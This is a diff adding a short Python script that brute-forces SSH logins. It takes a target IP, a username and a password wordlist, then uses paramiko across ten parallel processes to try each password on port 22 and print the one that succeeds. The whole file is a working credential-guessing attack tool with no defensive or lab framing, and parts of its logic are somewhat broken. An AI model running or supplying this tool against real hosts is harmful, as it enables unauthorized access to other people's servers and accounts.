@@ -1,0 +1,37 @@
+import os , socket , sys , paramiko ,time
+import multiprocessing
+from itertools import product
+
+ip=input("input ip address:")
+username=input("input username:")
+pwfile=input("Password file:")
+passcode=[]
+def fileOpening(pwfile):
+    try:
+        with open(pwfile , 'r')as pwfile:
+            for pw in pwfile.readlines():
+                password=pw.strip()
+                passcode.append(password)
+
+            global start
+            start=time.time()
+            with multiprocessing.Pool(processes=10)as pool:
+                pool.starmap(Connection,product(passcode))
+
+
+
+    except ValueError as err:
+        print("Error ",err)
+
+def Connection(password):
+    ssh=paramiko.SSHClient()
+    ssh.set_missing_host_key_policy((paramiko.AutoAddPolicy()))
+    ssh.connect( ip , port=22 , username=username , password=password)
+    print("Password is ",password)
+    end=time.time()
+    print("Time used...",end-start)
+    exit(1)
+    ssh.close()
+
+if __name__=='__main__':
+    fileOpening(pwfile)
